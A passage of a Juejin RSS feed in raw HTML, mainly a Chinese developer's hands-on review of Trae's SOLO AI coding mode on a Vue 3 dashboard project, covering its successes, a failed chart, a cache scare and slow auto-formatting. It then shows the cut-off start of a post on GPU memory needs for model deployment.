</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Trae SOLO项目真实需求]]></title>    <link>https://juejin.cn/post/7572997791451611174</link>    <guid>https://juejin.cn/post/7572997791451611174</guid>    <pubDate>2025-11-17T02:42:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7572997791451611174" data-draft-id="7572115057221369891" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Trae SOLO项目真实需求"/> <meta itemprop="keywords" content="Trae,前端,前端工程化"/> <meta itemprop="datePublished" content="2025-11-17T02:42:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="草帽lufei"/> <meta itemprop="url" content="https://juejin.cn/user/501033035632093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Trae SOLO项目真实需求
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501033035632093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    草帽lufei
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-17T02:42:42.000Z" title="Mon Nov 17 2025 02:42:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-17
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    53
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">前言</h2>
<p>看到 Trae SOLO 模式限时免费了，趁着免费，赶紧体验一波，Demo 什么的就不试了，直接用 SOLO 模式 SOLO 业务项目，开干，最终目标都是要服务于业务项目的</p>
<p>我是一吊毛前端开发，就从当前做的前端项目开用吧，接下来干的活是改大屏页，就从大屏页面开始，普通业务逻辑的话各路 AI 可能表现都还行，之前测试的是大屏这种明显靠感觉的还是差点意思，大屏页面基本主要还是手动改</p>
<h2 data-id="heading-1">使用 SOLO</h2>
<h3 data-id="heading-2">界面分析</h3>
<p>更新 Trae 后打开项目，分为4大块，从左到右分别是 SOLO模式任务，对话区，代码区，资源管理器，这点和常见的编辑器默认排版刚好相反，不过无所谓，既然这么设计，肯定是有他的道理的，因为现在模式变了，主要以对话，任务描述为主，然后再看代码</p>
<h3 data-id="heading-3">开始对话</h3>
<p>下面是我运行项目后，先在对话区先让它把一个页面的 tab 选项卡默认值改一下，它会自动检索项目代码，然后根据描述默认直接变更代码，然后最左侧任务会自动根据任务内容生成一个任务名称</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f732a2c7e03e413b9c6094df91daf255~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=OOcH3d8aqXsqbEkamsD3alBo7ik%3D" alt="image.png" loading="lazy"/></p>
<p>我发现 SOLO Coder 是自动就把项目代码变更了的，这里有个选项，就是用户确认后改代码和自动直接改代码，把这个确认加上了，防止把项目给改崩了，不好还原了，之前遇到过的痛苦经历，用 Agent 改代码，结果崩了，还自动改了，但是只改了半截，还原也只能还原半截，因为涉及了好几个文件，我手动吭哧吭哧忙活半天才恢复，整的都有阴影了</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5004c1e574dd4118a65b83a9eb7097b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=%2BAMCRCcvHtx9%2Bj1hLPp3c%2Fkj80I%3D" alt="image.png" loading="lazy"/></p>
<p>第二次继续，改点数据看看，顺便调整一下布局</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df149e0d4b4e4aa39338da8b5b3e8063~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=TTX9fZwfQr3vhmK7nE57yV%2F%2F%2BVY%3D" alt="image.png" loading="lazy"/></p>
<p>任务执行完后查看变更，点击查看变更，右侧会显示两个折叠面板，一个描述需求，一个是代码变更</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dfea62001dd4036b56797256e6bb63c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=FYVBn65tECtMAc%2BxZStr7IjfCzI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d52a08d3d1941eeacf47e78be67f28a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=ClpQD4a8lvgaYK%2FjxfrU0skqCUg%3D" alt="image.png" loading="lazy"/></p>
<p>这两个明确的小改动目前 SOLO 项目中内容改的正确，整体表现还不错，<code>手动点赞</code></p>
<h3 data-id="heading-4">上点强度</h3>
<p>接下来继续上强度试试，添加一个图表，提供了标题，X轴和Y轴数据和描述</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d1925e7b921404386ab811d7e07c298~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=f8zs7bjObVI2Tf6WIHqoKpF5Uqs%3D" alt="image.png" loading="lazy"/></p>
<p>等了一会儿，执行完了，这个应该比较简单，只是加一个图表而已，应该问题不大，看着代码页没啥大问题</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d7f594af0224aca8b0e7e26b81d7680~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=BhvTV3fYHH4YlyG%2B%2Fg7sXnEL%2BFw%3D" alt="image.png" loading="lazy"/></p>
<p>页面上效果只是一个空白，框是加了一个，但是图表没渲染出来，而且位置不对，没有在对应的内容下面生成图表，可能描述的还不够准确，位置倒还好，主要内容没出来</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2886b62385be43a292064da1762b7dae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=d5k5FpPsdO0weeg1LqIaMVDrXW0%3D" alt="image.png" loading="lazy"/></p>
<p>这里的内容是在项目弹框中，用的tab切换显示的页面，可能加载时机有问题，目前浏览器控制台无报错，先问反馈一下 SOLO，再让它分析一下</p>
<p>它根据理解又哐哐改了几行代码，说这个 <code>现在，图表会在页面渲染完成后可靠初始化，并在切换到该页签时再次初始化，确保正常显示</code>，它只负责生成代码，说的好似它亲眼见过一样</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62ab09b5ee644981a1c862b1a5cbc797~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=EDKk3G3KEO0E6HpEpOdLfyRoTIM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07d8b7a804e3453490db720a73963fd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=%2BnfgZZfEEE%2BXJPSJtYl3SncRdm8%3D" alt="image.png" loading="lazy"/></p>
<p>浏览器控制台有警告，图表还是空框，完犊子了，这里的代码由于涉及到业务一些东西，估计它没整明白（也有可能是这个shi山项目里面的一坨一坨的代码误导的），得手动完整排查一下这部分相关代码了</p>
<h3 data-id="heading-5">恢复手动</h3>
<p>然后我把这个 Trae 关了，重新打开了一下项目</p>
<p>沃日啊，怎么切换了一下模式重启后，什么改动都没有了，就剩一个默认tab选项效果还在了</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c83c619b73fe4efc87570e1c1776559d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=mKw8suUIb6G3P5ZTMwDwirdJBF0%3D" alt="image.png" loading="lazy"/></p>
<p>又使用AI自动改代码翻车的节奏吗，不会又被坑一下午吧</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08627f1624e44235be9e988c97ecd064~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=WfFMUrL9rtOIDtvTBlGryUF2%2Bfk%3D" alt="B98613A4BEA6AC9A4DA6C0A602D6C164.gif" loading="lazy"/></p>
<h3 data-id="heading-6">虚惊一场</h3>
<p>这什么鬼，我查了代码，代码更新的部分也都有啊，缓存？</p>
<p>重新 pnpm run dev ， 把原来的浏览器关掉，重新用无痕打开，又好了，果然浏览器缓存搞的鬼（松了一口气）</p>
<p>切换成编辑器模式后，手动改代码测试，Trae 中有这么个操作，自动写入，自动格式化，大概需要几十秒，这个过程有点慢，体验不是很好</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d46cb9c4f324e0081ed82bb7ab0d29f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=SiLkjXvwNhhFhuVLXQxsz3UoewI%3D" alt="image.png" loading="lazy"/></p>
<p>我动了点东西，又提示 正在应用代码操作 “整理导入” 自动写入，自动格式化保存，是什么鬼，我改了个索引数字，两个地方，也需要几十秒，电脑系统 Win11家庭版，内存32G，CPU i5,就启动了 Trae，其他编辑器没开，我查了任务栏 CPU，内存使用率不高，但是这个体验好差呀</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8fa2e553d5644ac85ab321e36600722~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=ly%2B5MEpqtgy11GJYCfeVP1bUSAg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">奇怪的自动化</h3>
<p>习惯了改点东西自动后保存后，一两秒就能在页面上效果，现在在 Trae 中自动保存，格式化完以后大约十几秒后，才能在页面上看到更新后的效果，我多次测试改几个数字或改一行代码页这样，啊...... (心态此时有点崩了)</p>
<p>难道是 Trae 中自动保存设置和一些插件一起工作不兼容的问题吗？我这边前端vue3项目，相关插件如下</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71cf68dcc5ab4b9792f375b869785bfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=1qYFAXgZce6xeb8dNxztyITPgLE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9aa90be335fb491993e295a2c2f420ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=6IJdphvj%2BvA2b0X7jGWgCiRnprM%3D" alt="image.png" loading="lazy"/></p>
<p>由于进入手改模式后，这个自动保存格式化操作时间有点久，可能是我哪里设置问题？还是操作方式问题？插件是从 VSCode 中同步过来的，这些配置也是日常操作，出现这种明显这么久的时间延迟，还是有点奇怪的</p>
<p>@Trae 官网技术人员，有空看看，难道你们标配都是 Mac book Pro 顶配，然后流畅的不行吗</p>
<h2 data-id="heading-8">小结</h2>
<p>目前来看除了特别代码实现出来的奇葩的功能，常见的功能需求提示描述相对准确后，SOLO模式整体还是非常亮眼的，虽然中间有点小插曲，整体 Trae SOLO 模式还是非常亮眼的</p>
<p>由于自动保存格式化时间有点长，又由于后面的需求也不太好直观描述，并且代码也是特别乱，我就先不用 SOLO 模式了，先换 VSCode 把那种产品自己都讲不明白的需求改了，不然加班不知道几个小时起步了</p>
<blockquote>
<p>欢迎大家讨论交流，如果喜欢本文章或感觉文章有用，动动你那发财的小手点赞、收藏、关注再走呗 <code>^_^</code> </p>
<p>微信公众号：草帽lufei</p>
</blockquote>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e1fd6d3bc93444bbb257fc45e1826b11~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.jpg#?w=240&amp;h=240&amp;s=10632&amp;e=jpg&amp;b=fdfafa" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[部署大模型需要多少GPU显存?一文教你精准计算]]></title>    <link>https://juejin.cn/post/7575829296452157450</link>    <guid>https://juejin.cn/post/7575829296452157450</guid>    <pubDate>2025-11-24T06:57:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575829296452157450" data-draft-id="7575887863796989962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="部署大模型需要多少GPU显存?一文教你精准计算"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-11-24T06:57:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="居然JuRan"/> <meta itemprop="url" content="https://juejin.cn/user/2524134427858205"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            部署大模型需要多少GPU显存?一文教你精准计算
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2524134427858205/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    居然JuRan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:57:21.000Z" title="Mon Nov 24 2025 06:57:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7